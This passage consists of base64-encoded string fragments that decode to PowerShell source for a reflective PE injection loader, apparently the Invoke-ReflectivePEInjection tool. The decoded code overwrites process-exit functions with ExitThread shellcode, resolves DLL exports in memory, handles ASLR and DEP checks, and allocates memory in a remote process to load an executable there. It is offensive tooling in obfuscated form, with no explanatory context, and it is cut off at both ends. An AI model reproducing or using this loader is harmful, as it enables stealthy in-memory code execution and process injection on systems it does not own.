ZGxlLkludm9rZSgibXNjb3JlZS5kbGwiKQoJCWlmICgkTXNjb3JlZUhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQl0aHJvdyAibXNjb3JlZSBoYW5kbGUgbnVs",
		"bCIKCQl9CgkJW0ludFB0cl0kQ29yRXhpdFByb2Nlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkTXNjb3JlZUhhbmRsZSwgIkNvckV4aXRQcm9jZXNzIikKCQlpZiAoJENvckV4aXRQcm9jZXNzQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQlUaHJvdyAiQ29yRXhpdFByb2Nlc3MgYWRkcmVzcyBub3QgZm91bmQiCgkJfQoJCSRFeGl0RnVuY3Rpb25zICs9ICRDb3JFeGl0UHJvY2Vzc0FkZHIKCQkKCQkjRXhpdFByb2Nlc3MgKHdoYXQgbm9uLW1hbmFnZWQgcHJvZ3JhbXMgdXNlKQoJCVtJbnRQdHJdJEV4aXRQcm9jZXNzQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiRXhpdFByb2Nlc3MiKQoJCWlmICgkRXhpdFByb2Nlc3NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJFeGl0UHJvY2VzcyBhZGRyZXNzIG5vdCBmb3VuZCIKCQl9CgkJJEV4aXRGdW5jdGlvbnMgKz0gJEV4aXRQcm9jZXNzQWRkcgoJCQoJCVtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAoJCWZvcmVhY2ggKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciBpbiAkRXhpdEZ1bmN0aW9ucykKCQl7CgkJCSRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9ICRQcm9jRXhpdEZ1bmN0aW9uQWRkcgoJCQkjVGhlIGZvbGxvd2luZyBpcyB0aGUgc2hlbGxjb2RlIChTaGVsbGNvZGU6IEV4aXRUaHJlYWQuYXNtKToKCQkJIzMyYml0IHNoZWxsY29kZQoJCQlbQnl0ZVtdXSRTaGVsbGNvZGUxID0gQCgweGJiKQoJCQlbQnl0ZVtdXSRTaGVsbGNvZGUyID0gQCgweGM2LCAweDAzLCAweDAxLCAweDgzLCAweGVjLCAweDIwLCAweDgzLCAweGU0LCAweGMwLCAweGJiKQoJCQkjNjRiaXQgc2hlbGxjb2RlIChTaGVsbGNvZGU6IEV4aXRUaHJlYWQuYXNtKQoJCQlpZiAoJFB0clNpemUgLWVxIDgpCgkJCXsKCQkJCVtCeXRlW11dJFNoZWxsY29kZTEgPSBAKDB4NDgsIDB4YmIpCgkJCQlbQnl0ZVtdXSRTaGVsbGNvZGUyID0gQCgweGM2LCAweDAzLCAweDAxLCAweDQ4LCAweDgzLCAweGVjLCAweDIwLCAweDY2LCAweDgzLCAweGU0LCAweGMwLCAweDQ4LCAweGJiKQoJCQl9CgkJCVtCeXRlW11dJFNoZWxsY29kZTMgPSBAKDB4ZmYsIDB4ZDMpCgkJCSRUb3RhbFNpemUgPSAkU2hlbGxjb2RlMS5MZW5ndGggKyAkUHRyU2l6ZSArICRTaGVsbGNvZGUyLkxlbmd0aCArICRQdHJTaXplICsgJFNoZWxsY29kZTMuTGVuZ3RoCgkJCQoJCQlbSW50UHRyXSRFeGl0VGhyZWFkQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiRXhpdFRocmVhZCIpCgkJCWlmICgkRXhpdFRocmVhZEFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiRXhpdFRocmVhZCBhZGRyZXNzIG5vdCBmb3VuZCIKCQkJfQoKCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQkJfQoJCQkKCQkJI01ha2UgY29weSBvZiBvcmlnaW5hbCBFeGl0UHJvY2VzcyBieXRlcwoJCQkkRXhpdFByb2Nlc3NPcmlnQnl0ZXNQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRvdGFsU2l6ZSkKCQkJJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEV4aXRQcm9jZXNzT3JpZ0J5dGVzUHRyLCAkUHJvY0V4aXRGdW5jdGlvbkFkZHIsIFtVSW50NjRdJFRvdGFsU2l6ZSkgfCBPdXQtTnVsbAoJCQkkUmV0dXJuQXJyYXkgKz0gLCgkUHJvY0V4aXRGdW5jdGlvbkFkZHIsICRFeGl0UHJvY2Vzc09yaWdCeXRlc1B0ciwgJFRvdGFsU2l6ZSkKCQkJCgkJCSNXcml0ZSB0aGUgRXhpdFRocmVhZCBzaGVsbGNvZGUgdG8gbWVtb3J5LiBUaGlzIHNoZWxsY29kZSB3aWxsIHdyaXRlIDB4MDEgdG8gRXhlRG9uZUJ5dGVQdHIgYWRkcmVzcyAoc28gUFMga25vd3MgdGhlIEVYRSBpcyBkb25lKSwgdGhlbiAKCQkJIwljYWxsIEV4aXRUaHJlYWQKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTEgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgkJCSRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRXhlRG9uZUJ5dGVQdHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCwgJGZhbHNlKQoJCQkkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgJFB0clNpemUKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTIgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgkJCSRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCAoJFNoZWxsY29kZTIuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRXhpdFRocmVhZEFkZHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCwgJGZhbHNlKQoJCQkkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgJFB0clNpemUKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTMgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgoJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKCQl9CgkJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCQlXcml0ZS1PdXRwdXQgJFJldHVybkFycmF5Cgl9CgkKCQoJI1RoaXMgZnVuY3Rpb24gdGFrZXMgYW4gYXJyYXkgb2YgYXJyYXlzLCB0aGUgaW5uZXIgYXJyYXkgb2YgZm9ybWF0IEAoJERlc3RBZGRyLCAkU291cmNlQWRkciwgJENvdW50KQoJIwlJdCBjb3BpZXMgQ291bnQgYnl0ZXMgZnJvbSBTb3VyY2UgdG8gRGVzdGluYXRpb24uCglGdW5jdGlvbiBDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtBcnJheVtdXQoJCSRDb3B5SW5mbywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkNvbnN0YW50cwoJCSkKCgkJW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCgkJZm9yZWFjaCAoJEluZm8gaW4gJENvcHlJbmZvKQoJCXsKCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQkJfQoJCQkKCQkJJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEluZm9bMF0sICRJbmZvWzFdLCBbVUludDY0XSRJbmZvWzJdKSB8IE91dC1OdWxsCgkJCQoJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKCQl9Cgl9CgoKCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCSMjIyMjIyMjIyMgICAgRlVOQ1RJT05TICAgIyMjIyMjIyMjIyMKCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCUZ1bmN0aW9uIEdldC1NZW1vcnlQcm9jQWRkcmVzcwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkUEVIYW5kbGUsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3RyaW5nXQoJCSRGdW5jdGlvbk5hbWUKCQkpCgkJCgkJJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwoJCSRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwoJCSRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJCgkJI0dldCB0aGUgZXhwb3J0IHRhYmxlCgkJaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5FeHBvcnRUYWJsZS5TaXplIC1lcSAwKQoJCXsKCQkJcmV0dXJuIFtJbnRQdHJdOjpaZXJvCgkJfQoJCSRFeHBvcnRUYWJsZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRXhwb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCgkJJEV4cG9ydFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEV4cG9ydFRhYmxlUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9FWFBPUlRfRElSRUNUT1JZKQoJCQoJCWZvciAoJGkgPSAwOyAkaSAtbHQgJEV4cG9ydFRhYmxlLk51bWJlck9mTmFtZXM7ICRpKyspCgkJewoJCQkjQWRkcmVzc09mTmFtZXMgaXMgYW4gYXJyYXkgb2YgcG9pbnRlcnMgdG8gc3RyaW5ncyBvZiB0aGUgbmFtZXMgb2YgdGhlIGZ1bmN0aW9ucyBleHBvcnRlZAoJCQkkTmFtZU9mZnNldFB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkRXhwb3J0VGFibGUuQWRkcmVzc09mTmFtZXMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQzMl0pKSkKCQkJJE5hbWVQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE5hbWVPZmZzZXRQdHIsIFtUeXBlXVtVSW50MzJdKSkKCQkJJE5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJE5hbWVQdHIpCgoJCQlpZiAoJE5hbWUgLWNlcSAkRnVuY3Rpb25OYW1lKQoJCQl7CgkJCQkjQWRkcmVzc09mTmFtZU9yZGluYWxzIGlzIGEgdGFibGUgd2hpY2ggY29udGFpbnMgcG9pbnRzIHRvIGEgV09SRCB3aGljaCBpcyB0aGUgaW5kZXggaW4gdG8gQWRkcmVzc09mRnVuY3Rpb25zCgkJCQkjICAgIHdoaWNoIGNvbnRhaW5zIHRoZSBvZmZzZXQgb2YgdGhlIGZ1bmN0aW9uIGluIHRvIHRoZSBETEwKCQkJCSRPcmRpbmFsUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lT3JkaW5hbHMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKSkKCQkJCSRGdW5jSW5kZXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JkaW5hbFB0ciwgW1R5cGVdW1VJbnQxNl0pCgkJCQkkRnVuY09m",
		"ZnNldEFkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEV4cG9ydFRhYmxlLkFkZHJlc3NPZkZ1bmN0aW9ucyArICgkRnVuY0luZGV4ICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtVSW50MzJdKSkpCgkJCQkkRnVuY09mZnNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRGdW5jT2Zmc2V0QWRkciwgW1R5cGVdW1VJbnQzMl0pCgkJCQlyZXR1cm4gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRGdW5jT2Zmc2V0KQoJCQl9CgkJfQoJCQoJCXJldHVybiBbSW50UHRyXTo6WmVybwoJfQoKCglGdW5jdGlvbiBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlICldCgkJW0J5dGVbXV0KCQkkUEVCeXRlcywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KCQlbU3RyaW5nXQoJCSRFeGVBcmdzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQoJCVtJbnRQdHJdCgkJJFJlbW90ZVByb2NIYW5kbGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSID0gJGZhbHNlCgkJKQoJCQoJCSRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQoJCQoJCSNHZXQgV2luMzIgY29uc3RhbnRzIGFuZCBmdW5jdGlvbnMKCQkkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHMKCQkkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKCQkkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCgkJCgkJJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2UKCQlpZiAoKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSAkbnVsbCkgLWFuZCAoJFJlbW90ZVByb2NIYW5kbGUgLW5lIFtJbnRQdHJdOjpaZXJvKSkKCQl7CgkJCSRSZW1vdGVMb2FkaW5nID0gJHRydWUKCQl9CgkJCgkJI0dldCBiYXNpYyBQRSBpbmZvcm1hdGlvbgoJCVdyaXRlLVZlcmJvc2UgIkdldHRpbmcgYmFzaWMgUEUgaW5mb3JtYXRpb24gZnJvbSB0aGUgZmlsZSIKCQkkUEVJbmZvID0gR2V0LVBFQmFzaWNJbmZvIC1QRUJ5dGVzICRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgkJJE9yaWdpbmFsSW1hZ2VCYXNlID0gJFBFSW5mby5PcmlnaW5hbEltYWdlQmFzZQoJCSROWENvbXBhdGlibGUgPSAkdHJ1ZQoJCWlmICgoW0ludF0gJFBFSW5mby5EbGxDaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OWF9DT01QQVQpIC1uZSAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCkKCQl7CgkJCVdyaXRlLVdhcm5pbmcgIlBFIGlzIG5vdCBjb21wYXRpYmxlIHdpdGggREVQLCBtaWdodCBjYXVzZSBpc3N1ZXMiIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCgkJCSROWENvbXBhdGlibGUgPSAkZmFsc2UKCQl9CgkJCgkJCgkJI1ZlcmlmeSB0aGF0IHRoZSBQRSBhbmQgdGhlIGN1cnJlbnQgcHJvY2VzcyBhcmUgdGhlIHNhbWUgYml0cyAoMzJiaXQgb3IgNjRiaXQpCgkJJFByb2Nlc3M2NEJpdCA9ICR0cnVlCgkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKCQl7CgkJCSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQoJCQkkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJJc1dvdzY0UHJvY2VzcyIpCgkJCWlmICgkUmVzdWx0IC1lcSBbSW50UHRyXTo6WmVybykKCQkJewoJCQkJVGhyb3cgIkNvdWxkbid0IGxvY2F0ZSBJc1dvdzY0UHJvY2VzcyBmdW5jdGlvbiB0byBkZXRlcm1pbmUgaWYgdGFyZ2V0IHByb2Nlc3MgaXMgMzJiaXQgb3IgNjRiaXQiCgkJCX0KCQkJCgkJCVtCb29sXSRXb3c2NFByb2Nlc3MgPSAkZmFsc2UKCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbUmVmXSRXb3c2NFByb2Nlc3MpCgkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCQl7CgkJCQlUaHJvdyAiQ2FsbCB0byBJc1dvdzY0UHJvY2VzcyBmYWlsZWQiCgkJCX0KCQkJCgkJCWlmICgoJFdvdzY0UHJvY2VzcyAtZXEgJHRydWUpIC1vciAoKCRXb3c2NFByb2Nlc3MgLWVxICRmYWxzZSkgLWFuZCAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCkpKQoJCQl7CgkJCQkkUHJvY2VzczY0Qml0ID0gJGZhbHNlCgkJCX0KCQkJCgkJCSNQb3dlclNoZWxsIG5lZWRzIHRvIGJlIHNhbWUgYml0IGFzIHRoZSBQRSBiZWluZyBsb2FkZWQgZm9yIEludFB0ciB0byB3b3JrIGNvcnJlY3RseQoJCQkkUG93ZXJTaGVsbDY0Qml0ID0gJHRydWUKCQkJaWYgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLW5lIDgpCgkJCXsKCQkJCSRQb3dlclNoZWxsNjRCaXQgPSAkZmFsc2UKCQkJfQoJCQlpZiAoJFBvd2VyU2hlbGw2NEJpdCAtbmUgJFByb2Nlc3M2NEJpdCkKCQkJewoJCQkJdGhyb3cgIlBvd2VyU2hlbGwgbXVzdCBiZSBzYW1lIGFyY2hpdGVjdHVyZSAoeDg2L3g2NCkgYXMgUEUgYmVpbmcgbG9hZGVkIGFuZCByZW1vdGUgcHJvY2VzcyIKCQkJfQoJCX0KCQllbHNlCgkJewoJCQlpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtbmUgOCkKCQkJewoJCQkJJFByb2Nlc3M2NEJpdCA9ICRmYWxzZQoJCQl9CgkJfQoJCWlmICgkUHJvY2VzczY0Qml0IC1uZSAkUEVJbmZvLlBFNjRCaXQpCgkJewoJCQlUaHJvdyAiUEUgcGxhdGZvcm0gZG9lc24ndCBtYXRjaCB0aGUgYXJjaGl0ZWN0dXJlIG9mIHRoZSBwcm9jZXNzIGl0IGlzIGJlaW5nIGxvYWRlZCBpbiAoMzIvNjRiaXQpIgoJCX0KCQkKCgkJI0FsbG9jYXRlIG1lbW9yeSBhbmQgd3JpdGUgdGhlIFBFIHRvIG1lbW9yeS4gSWYgdGhlIFBFIHN1cHBvcnRzIEFTTFIsIGFsbG9jYXRlIHRvIGEgcmFuZG9tIG1lbW9yeSBhZGRyZXNzCgkJV3JpdGUtVmVyYm9zZSAiQWxsb2NhdGluZyBtZW1vcnkgZm9yIHRoZSBQRSBhbmQgd3JpdGUgaXRzIGhlYWRlcnMgdG8gbWVtb3J5IgoJCQogICAgICAgICNBU0xSIGNoZWNrCgkJW0ludFB0cl0kTG9hZEFkZHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRQRVN1cHBvcnRzQVNMUiA9IChbSW50XSAkUEVJbmZvLkRsbENoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRSkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFCgkJaWYgKCgtbm90ICRGb3JjZUFTTFIpIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKCQl7CgkJCVdyaXRlLVdhcm5pbmcgIlBFIGZpbGUgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCBpcyBub3QgQVNMUiBjb21wYXRpYmxlLiBJZiB0aGUgbG9hZGluZyBmYWlscywgdHJ5IHJlc3RhcnRpbmcgUG93ZXJTaGVsbCBhbmQgdHJ5aW5nIGFnYWluIE9SIHRyeSB1c2luZyB0aGUgLUZvcmNlQVNMUiBmbGFnIChjb3VsZCBjYXVzZSBjcmFzaGVzKSIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKCQkJW0ludFB0cl0kTG9hZEFkZHIgPSAkT3JpZ2luYWxJbWFnZUJhc2UKCQl9CiAgICAgICAgZWxzZWlmICgkRm9yY2VBU0xSIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGZpbGUgZG9lc24ndCBzdXBwb3J0IEFTTFIgYnV0IC1Gb3JjZUFTTFIgaXMgc2V0LiBGb3JjaW5nIEFTTFIgb24gdGhlIFBFIGZpbGUuIFRoaXMgY291bGQgcmVzdWx0IGluIGEgY3Jhc2guIgogICAgICAgIH0KCiAgICAgICAgaWYgKCRGb3JjZUFTTFIgLWFuZCAkUmVtb3RlTG9hZGluZykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJDYW5ub3QgdXNlIEZvcmNlQVNMUiB3aGVuIGxvYWRpbmcgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4iIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgfQogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtYW5kICgtbm90ICRQRVN1cHBvcnRzQVNMUikpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiUEUgZG9lc24ndCBzdXBwb3J0IEFTTFIuIENhbm5vdCBsb2FkIGEgbm9uLUFTTFIgUEUgaW4gdG8gYSByZW1vdGUgcHJvY2VzcyIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICB9CgoJCSRQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCQkJCSNUaGlzIGlzIHdoZXJlIHRoZSBQRSBpcyBhbGxvY2F0ZWQgaW4gUG93ZXJTaGVsbAoJCSRFZmZlY3RpdmVQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCQkjVGhpcyBpcyB0aGUgYWRkcmVzcyB0aGUgUEUgd2lsbCBiZSBsb2FkZWQgdG8uIElmIGl0IGlzIGxvYWRlZCBpbiBQb3dlclNoZWxsLCB0aGlzIGVxdWFscyAkUEVIYW5kbGUuIElmIGl0IGlzIGxvYWRlZCBpbiBhIHJlbW90ZSBwcm9jZXNzLCB0aGlzIGlzIHRoZSBhZGRyZXNzIGluIHRoZSByZW1vdGUgcHJvY2Vzcy4KCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCXsKCQkJI0FsbG9jYXRlIHNwYWNlIGluIHRoZSByZW1vdGUgcHJvY2VzcywgYW5kIGFsc28gYWxsb2NhdGUgc3BhY2UgaW4gUG93ZXJTaGVsbC4gVGhlIFBFIHdpbGwgYmUgc2V0dXAgaW4gUG93ZXJTaGVsbCBhbmQgY29waWVkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyB3aGVuIGl0IGlzIHNldHVwCgkJCSRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCQkKCQkJI3RvZG8sIGVycm9yIGhhbmRsaW5nIG5lZWRzIHRvIGRlbGV0ZSB0aGlzIG1lbW9yeSBpZiBhbiBlcnJvciBoYXBwZW5zIGFsb25nIHRoZSB3YXkKCQkJJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRs